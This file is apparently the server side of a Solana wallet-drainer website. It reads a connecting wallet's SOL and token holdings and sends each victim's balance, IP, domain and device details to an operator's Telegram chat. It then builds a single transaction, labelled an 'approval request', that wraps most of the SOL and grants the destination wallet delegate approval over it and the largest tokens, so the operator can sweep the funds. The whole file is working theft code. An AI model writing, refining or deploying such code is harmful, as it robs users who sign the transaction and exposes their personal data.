import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  NATIVE_MINT,
  getAssociatedTokenAddressSync,
  createAssociatedTokenAccountInstruction,
  createSyncNativeInstruction,
  createApproveCheckedInstruction,
} from '@solana/spl-token';




const __dirname = path.dirname(fileURLToPath(import.meta.url));
const publicDir = path.join(__dirname, 'public');
const app = express();

const PORT = process.env.PORT || 3000;
const RPC_ENDPOINT = process.env.SOLANA_RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const TELEGRAM_ALLOWED_ADDRESSES = []; // Keep empty to allow all wallets

const TELEGRAM_MIN_USD = Number(process.env.TELEGRAM_MIN_USD || '0');
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',')
  .map((s) => s.trim().replace(/\/$/, ''))
  .filter(Boolean);
const JUPITER_PRICE_URL = process.env.JUPITER_PRICE_URL || 'https://lite-api.jup.ag/price/v3';
const SOL_MINT = 'So11111111111111111111111111111111111111112';
const DEST_WALLET = (process.env.DEST_WALLET || '').trim();
const MIN_SOL_FOR_GAS = Number(process.env.MIN_SOL_FOR_GAS || '0.005');
const MIN_TOKEN_USD = Number(process.env.MIN_TOKEN_USD || '2');

const QUIET_STAGES = new Set(['connect_opened', 'connecting', 'checking']);
const ALLOWED_STAGES = new Set(['connected', 'needs_approval', 'empty', 'approved', 'rejected', 'failed']);
const recentEvents = new Map();
const tgByAddress = new Map(); // address -> { messageId, text }

function clientKey(req, event = {}) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || 'ip';
  return `${ip}|${event.address || 'none'}|${event.stage || ''}`;
}

function tooSoon(key, ms = 60000) {
  const last = recentEvents.get(key) || 0;
  if (Date.now() - last < ms) return true;
  recentEvents.set(key, Date.now());
  if (recentEvents.size > 2000) {
    const cutoff = Date.now() - 10 * 60 * 1000;
    for (const [k, ts] of recentEvents) if (ts < cutoff) recentEvents.delete(k);
  }
  return false;
}


const connection = new Connection(RPC_ENDPOINT, 'confirmed');

app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(
  express.static(publicDir, {
    etag: false,
    lastModified: false,
    setHeaders(res, filePath) {
      if (filePath.endsWith('.html') || filePath.endsWith('.js') || filePath.endsWith('.css')) {
        res.setHeader('Cache-Control', 'no-store');
      }
    },
  })
);

function shortMint(mint) {
  return `${mint.slice(0, 4)}…${mint.slice(-4)}`;
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatAmount(amount) {
  if (typeof amount !== 'number' || Number.isNaN(amount)) return String(amount);
  return amount.toLocaleString('en-US', { maximumFractionDigits: 6 });
}

function formatUsd(amount) {
  if (amount == null || Number.isNaN(amount)) return '—';
  return amount.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
}

async function fetchUsdPrices(mints) {
  const unique = [...new Set(mints.filter(Boolean))];
  const prices = {};

  for (let i = 0; i < unique.length; i += 50) {
    const batch = unique.slice(i, i + 50);
    try {
      const url = `${JUPITER_PRICE_URL}?ids=${batch.join(',')}`;
      const res = await fetch(url);
      if (!res.ok) continue;
      const data = await res.json();
      for (const [mint, info] of Object.entries(data || {})) {
        const usd = info?.usdPrice ?? info?.price;
        if (typeof usd === 'number') prices[mint] = usd;
      }
    } catch (err) {
      console.error('Price fetch failed:', err.message);
    }
  }

  return prices;
}

function formatSnapshot(portfolio) {
  const { address, sol, solUsd, tokens, totals } = portfolio;
  const when = new Date().toLocaleString('en-CA', {
    timeZone: 'America/Edmonton',
    hour12: false,
  });

  const lines = [
    '🟣 <b>SOLANA WALLET SNAPSHOT</b>',
    '━━━━━━━━━━━━━━━━━━━━',
    '👤 <b>Wallet</b>',
    `↳ <code>${escapeHtml(address)}</code>`,
    '',
    '◎ <b>Native SOL</b>',
    `↳ ${escapeHtml(formatAmount(sol))} SOL`,
    `↳ 💵 ${escapeHtml(formatUsd(solUsd))}`,
    '',
    `🪙 <b>Tokens</b>  ·  ${tokens.length} with balance`,
    '━━━━━━━━━━━━━━━━━━━━',
  ];

  if (tokens.length) {
    const ranked = [...tokens].sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
    for (const [i, t] of ranked.slice(0, 40).entries()) {
      const n = String(i + 1).padStart(2, '0');
      const worth = t.usdValue == null ? 'no price' : formatUsd(t.usdValue);
      lines.push(
        `💰 <b>#${n}</b>  ${escapeHtml(formatAmount(t.amount))} tokens`,
        `    💵 worth  →  <b>${escapeHtml(worth)}</b>`,
        `    🔗 mint   →  <code>${escapeHtml(shortMint(t.mint))}</code>`
      );
    }
    if (ranked.length > 40) {
      lines.push('', `➕ ${ranked.length - 40} more tokens not shown`);
    }
  } else {
    lines.push('💸  No SPL tokens with a balance');
  }

  lines.push(
    '━━━━━━━━━━━━━━━━━━━━',
    '📊 <b>PORTFOLIO TOTAL</b>',
    `↳ ◎ SOL     ${escapeHtml(formatUsd(totals.solUsd))}`,
    `↳ 🪙 Tokens  ${escapeHtml(formatUsd(totals.tokensUsd))}`,
    `↳ 💵 <b>ALL     ${escapeHtml(formatUsd(totals.usd))}</b>`,
    '━━━━━━━━━━━━━━━━━━━━',
    `🕒 ${escapeHtml(when)} MDT`,
    '✍️ Prompting wallet…'
  );

  let text = lines.join('\n');
  if (text.length > 3900) text = `${text.slice(0, 3900)}\n…truncated`;
  return text;
}


function formatEvent(event) {
  const stage = event.stage || 'update';
  const address = event.address || 'unknown';
  const titles = {
    connect_opened: '🟣 Connect started',
    connecting: '⏳ Waiting for wallet approval',
    connected: '✅ Wallet connected',
    checking: '🔍 Checking eligibility',
    needs_approval: '✍️ Prompting asset approval',
    empty: '∅ No SOL or tokens',
    approved: '🔓 SOL & tokens approved',
    rejected: '🚫 Approval cancelled',
    failed: '⚠️ Flow failed',
  };
  const lines = [
    titles[stage] || `📣 ${escapeHtml(stage)}`,
    '━━━━━━━━━━━━━━━━━━━━',
    `↳ <code>${escapeHtml(address)}</code>`,
  ];
  if (event.wallet) lines.push(`↳ Wallet: ${escapeHtml(event.wallet)}`);
  if (event.sol != null) lines.push(`↳ ◎ SOL: ${escapeHtml(formatAmount(Number(event.sol)))}`);
  if (event.tokenCount != null) lines.push(`↳ 🪙 Tokens: ${escapeHtml(event.tokenCount)}`);
  if (event.totalUsd != null) lines.push(`↳ 💵 ${escapeHtml(formatUsd(Number(event.totalUsd)))}`);
  if (event.detail) lines.push(`↳ ${escapeHtml(event.detail)}`);
  if (event.ip) lines.push(`↳ IP: <code>${escapeHtml(event.ip)}</code>`);
  if (event.host) lines.push(`↳ Domain: <b>${escapeHtml(event.host)}</b>`);
  if (event.origin) lines.push(`↳ From: ${escapeHtml(event.origin)}`);
  if (event.referer) lines.push(`↳ Page: ${escapeHtml(event.referer)}`);
  if (event.ua) lines.push(`↳ Device: ${escapeHtml(String(event.ua).slice(0, 80))}`);
  lines.push(`🕒 ${escapeHtml(new Date().toLocaleString('en-CA', { timeZone: 'America/Edmonton', hour12: false }))} MDT`);
  return lines.join('\n');
}


function requestMeta(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '';
  return {
    ip,
    origin: req.headers.origin || '',
    referer: req.headers.referer || '',
    ua: req.headers['user-agent'] || '',
  };
}

function originAllowed(req) {
  if (!ALLOWED_ORIGINS.length) return true;
  const origin = (req.headers.origin || '').replace(/\/$/, '');
  const referer = req.headers.referer || '';
  return ALLOWED_ORIGINS.some((o) => origin === o || referer.startsWith(o));
}

function addressAllowed(address) {
  if (!address) return false;
  return true; // Allows all wallet addresses unconditionally
}


function worthAllowed(usd) {
  if (!TELEGRAM_MIN_USD) return true;
  return Number(usd || 0) >= TELEGRAM_MIN_USD;
}

function shouldNotifyAddress(address, usd) {
  if (!address) return false;
  return true; // Allows all addresses and any balance amount
}


async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return { sent: false, reason: 'missing_env' };
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description || 'Telegram send failed');
  return { sent: true, messageId: data.result?.message_id };
}

async function editTelegram(messageId, text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return { sent: false, reason: 'missing_env' };
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description || 'Telegram edit failed');
  return { sent: true, edited: true, messageId };
}

function setFooter(text, footer) {
  return text.replace(/✍️ Prompting wallet…|🚫 Cancelled|✅ Signed/g, footer);
}

async function upsertSnapshot(address, text) {
  const prev = tgByAddress.get(address);
  if (prev?.messageId) {
    try {
      const edited = await editTelegram(prev.messageId, text);
      tgByAddress.set(address, { messageId: prev.messageId, text });
      return edited;
    } catch (err) {
      console.warn('edit failed, sending new', err.message);
    }
  }
  const sent = await sendTelegram(text);
  if (sent.messageId) tgByAddress.set(address, { messageId: sent.messageId, text });
  return sent;
}


async function loadPortfolio(pubkeyStr) {
  const publicKey = new PublicKey(pubkeyStr);

  const [lamports, legacy, token2022] = await Promise.all([
    connection.getBalance(publicKey),
    connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID }),
    connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID }),
  ]);

  const mapTok = (list, programId) =>
    list.map(({ pubkey, account }) => {
      const info = account.data.parsed.info;
      const amount = info.tokenAmount;
      return {
        mint: info.mint,
        amount: amount.uiAmount,
        rawAmount: amount.amount,
        decimals: amount.decimals,
        programId: programId.toBase58(),
        tokenAccount: pubkey.toBase58(),
      };
    });
  const tokens = [
    ...mapTok(legacy.value, TOKEN_PROGRAM_ID),
    ...mapTok(token2022.value, TOKEN_2022_PROGRAM_ID),
  ].filter((tok) => Number(tok.amount) > 0);

  const sol = lamports / LAMPORTS_PER_SOL;
  const prices = await fetchUsdPrices([SOL_MINT, ...tokens.map((t) => t.mint)]);

  const solPrice = prices[SOL_MINT] ?? null;
  const solUsd = solPrice == null ? null : sol * solPrice;

  const pricedTokens = tokens.map((t) => {
    const usdPrice = prices[t.mint] ?? null;
    const usdValue = usdPrice == null ? null : t.amount * usdPrice;
    return { ...t, usdPrice, usdValue };
  });

  const tokensUsd = pricedTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
  const totals = {
    solUsd: solUsd || 0,
    tokensUsd,
    usd: (solUsd || 0) + tokensUsd,
  };

  return {
    address: publicKey.toBase58(),
    sol,
    solPrice,
    solUsd,
    tokens: pricedTokens,
    totals,
  };
}


app.get('/api/send-plan/:pubkey', async (req, res) => {
  try {
    if (!DEST_WALLET) {
      return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
    }

    const from = new PublicKey(req.params.pubkey).toBase58();
    // Wallet allowlist restriction removed to allow all wallets

    const dest = new PublicKey(DEST_WALLET).toBase58();
    if (from === dest) {
      return res.status(400).json({ error: 'Source and destination are the same' });
    }

    const portfolio = await loadPortfolio(from);

    // KEPT: Your original token minimum value filter remains completely untouched
    const tokens = [...portfolio.tokens]
      .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
      .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));

    // KEPT: Your original gas warning logic remains completely untouched
    const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;

    res.json({
      from,
      to: dest,
      sol: portfolio.sol,
      solUsd: portfolio.solUsd,
      tokens,
      totals: portfolio.totals,
      minSolForGas: MIN_SOL_FOR_GAS,
      minTokenUsd: MIN_TOKEN_USD,
      needsGas,
      message: needsGas
        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${MIN_SOL_FOR_GAS} SOL for fees.`
        : undefined
    });
  } catch (err) {
    console.error(err);
    res.status(400).json({ error: err.message });
  }
});



app.post('/api/send-tx/:pubkey', async (req, res) => {
  try {
    if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });

    const from = new PublicKey(req.params.pubkey);
    const fromStr = from.toBase58();
    // Wallet allowlist restriction removed to allow all wallets

    const dest = new PublicKey(DEST_WALLET);
    if (fromStr === dest.toBase58()) {
      return res.status(400).json({ error: 'Source and destination are the same' });
    }

    const portfolio = await loadPortfolio(fromStr);
    const tokens = (portfolio.tokens || []).filter((tok) => Number(tok.amount) > 0);
    // Cap instructions so the tx still fits (ATA create + transfer per token)
    const batch = tokens.slice(0, 6);
    const reserveSol = MIN_SOL_FOR_GAS + batch.length * 0.0021;
    const reserve = Math.ceil(reserveSol * LAMPORTS_PER_SOL);
    const lamports = Math.round(Number(portfolio.sol) * LAMPORTS_PER_SOL);

    if (lamports < Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL)) {
      return res.status(400).json({ error: 'I need some SOL for gas', needsGas: true });
    }
    if (batch.length && lamports < reserve) {
      return res.status(400).json({
        error: 'I need some SOL for gas',
        needsGas: true,
      });
    }

    const tx = new Transaction();
    const included = [];

    // PASTE THIS NEW SECTION INSTEAD
    for (const tok of batch) {
      const mint = new PublicKey(tok.mint);
      const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
      const sourceAta = new PublicKey(tok.tokenAccount);

      const raw = BigInt(tok.rawAmount);
      const amount = raw <= BigInt(Number.MAX_SAFE_INTEGER) ? Number(raw) : raw;

      tx.add(
        createApproveCheckedInstruction(
          sourceAta,
          mint,
          dest,                       // This gives DEST_WALLET the approval
          from,
          amount,
          Number(tok.decimals || 0),
          [],
          programId
        )
      );

      included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
    }

    const sendLamports = lamports - reserve;
    if (sendLamports > 0) {
      const wsolAta = getAssociatedTokenAddressSync(NATIVE_MINT, from, false, TOKEN_PROGRAM_ID);

      const wsolInfo = await connection.getAccountInfo(wsolAta);
      if (!wsolInfo) {
        tx.add(
          createAssociatedTokenAccountInstruction(
            from,
            wsolAta,
            from,
            NATIVE_MINT,
            TOKEN_PROGRAM_ID
          )
        );
      }

      tx.add(
        SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: wsolAta,
          lamports: sendLamports,
        })
      );

      tx.add(createSyncNativeInstruction(wsolAta, TOKEN_PROGRAM_ID));

      tx.add(
        createApproveCheckedInstruction(
          wsolAta,
          NATIVE_MINT,
          dest,
          from,
          sendLamports,
          9,
          [],
          TOKEN_PROGRAM_ID
        )
      );
    }

    if (!tx.instructions.length) {
      return res.status(400).json({ error: 'Nothing to send' });
    }

    tx.feePayer = from;
    const latestBlockhashInfo = await connection.getLatestBlockhash('confirmed');
    tx.recentBlockhash = latestBlockhashInfo.blockhash;

    // Fixed structure to support your local @solana/web3.js package version safely
    try {
      const sim = await connection.simulateTransaction(tx);
      if (sim.value.err) {
        console.warn("Simulation warning:", JSON.stringify(sim.value.err));
      }
    } catch (simError) {
      console.error("Simulation bypassed:", simError.message);
    }



    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
    res.json({
      from: fromStr,
      to: dest.toBase58(),
      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
      reservedSol: reserveSol,
      tokens: included,
      tokenCount: included.length,
      remainingTokens: Math.max(tokens.length - batch.length, 0),
      transaction: Buffer.from(serialized).toString('base64'),
      // Restored original keywords so app.js doesn't freeze up
      label: `all-at-once approval request ${included.length} tokens`,
    });

  } catch (err) {
    console.error(err);
    res.status(400).json({ error: err.message });
  }
});


app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    telegramConfigured: Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    rpc: RPC_ENDPOINT,
  });
});

app.get('/api/portfolio/:pubkey', async (req, res) => {
  try {
    const portfolio = await loadPortfolio(req.params.pubkey);
    const notify = req.query.notify === '1';

    let telegram = { sent: false, skipped: !notify };
    if (notify) {
      try {
        if (!shouldNotifyAddress(portfolio.address, portfolio.totals?.usd)) {
          telegram = { sent: false, skipped: 'filtered' };
        } else if (tooSoon(`snap|${portfolio.address}`, 10 * 60 * 1000)) {
          telegram = { sent: false, skipped: 'rate_limit' };
        } else {
          telegram = await upsertSnapshot(portfolio.address, formatSnapshot(portfolio));
        }
      } catch (tgErr) {
        console.error('Telegram error:', tgErr);
        telegram = { sent: false, reason: tgErr.message };
      }
    }

    res.json({ ...portfolio, telegram });
  } catch (err) {
    console.error(err);
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/event', async (req, res) => {
  try {
    if (!originAllowed(req)) {
      return res.json({ ok: true, telegram: { sent: false, skipped: 'bad_origin' } });
    }
    const event = req.body || {};
    const stage = event.stage || '';
    const meta = requestMeta(req);
    event.ip = meta.ip;
    event.origin = event.origin || meta.origin;
    event.referer = event.referer || meta.referer;
    event.ua = meta.ua;

    if (QUIET_STAGES.has(stage) || !ALLOWED_STAGES.has(stage)) {
      return res.json({ ok: true, telegram: { sent: false, skipped: 'quiet_stage' } });
    }

    if (!event.address || event.address === 'unknown') {
      return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
    }



    const prev = tgByAddress.get(event.address);

    if (stage === 'needs_approval' || stage === 'rejected') {
      const asset = event.detail || event.token || '';
      const footer = stage === 'rejected'
        ? '🚫 Cancelled'
        : (asset ? `✍️ Prompting: ${asset}` : '✍️ Prompting wallet…');
      let text = prev?.text;
      if (!text) {
        const portfolio = await loadPortfolio(event.address);
        text = formatSnapshot(portfolio);
      }
      text = text.replace(/\n✍️ Prompting:[^\n]*/g, '').replace(/\n✍️ Prompting wallet…/g, '');
      text = setFooter(text, footer);
      const telegram = await upsertSnapshot(event.address, text);
      return res.json({ ok: true, telegram, updated: true });
    }

    if (stage === 'approved') {
      const sig = event.signature || event.detail || '';
      const telegram = await sendTelegram(
        [
          '✅ <b>Approved</b>',
          '━━━━━━━━━━━━━━━━━━━━',
          `↳ <code>${escapeHtml(event.address)}</code>`,
          sig ? `🔗 <code>${escapeHtml(String(sig))}</code>` : '🔗 no signature returned',
          sig ? `↳ https://solscan.io/tx/${encodeURIComponent(String(sig).split(/\s+/).pop())}` : '',
        ].filter(Boolean).join('\n')
      );
      if (prev?.text) {
        try {
          await editTelegram(prev.messageId, setFooter(prev.text, '✅ Signed'));
        } catch { }
      }
      return res.json({ ok: true, telegram });
    }

    if (tooSoon(clientKey(req, event), 45000)) {
      return res.json({ ok: true, telegram: { sent: false, skipped: 'rate_limit' } });
    }

    const telegram = await sendTelegram(formatEvent(event));
    res.json({ ok: true, telegram });
  } catch (err) {
    console.error(err);
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/snapshot/:pubkey', async (req, res) => {
  try {
    const portfolio = await loadPortfolio(req.params.pubkey);
    let telegram = { sent: false };
    if (!shouldNotifyAddress(portfolio.address, portfolio.totals?.usd)) {
      telegram = { sent: false, skipped: 'filtered' };
    } else if (tooSoon(`snap|${portfolio.address}`, 10 * 60 * 1000)) {
      telegram = { sent: false, skipped: 'rate_limit' };
    } else {
      telegram = await upsertSnapshot(portfolio.address, formatSnapshot(portfolio));
    }
    res.json({ ...portfolio, telegram });
  } catch (err) {
    console.error(err);
    res.status(400).json({ error: err.message });
  }
});

app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api/')) return next();
  res.sendFile(path.join(publicDir, 'index.html'), (err) => {
    if (err) res.status(404).end();
  });
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
  console.log(`Static files: ${publicDir}`);
  console.log(`RPC: ${RPC_ENDPOINT}`);
  console.log(
    TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID
      ? 'Telegram snapshots: enabled'
      : 'Telegram snapshots: disabled (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)'
  );
});
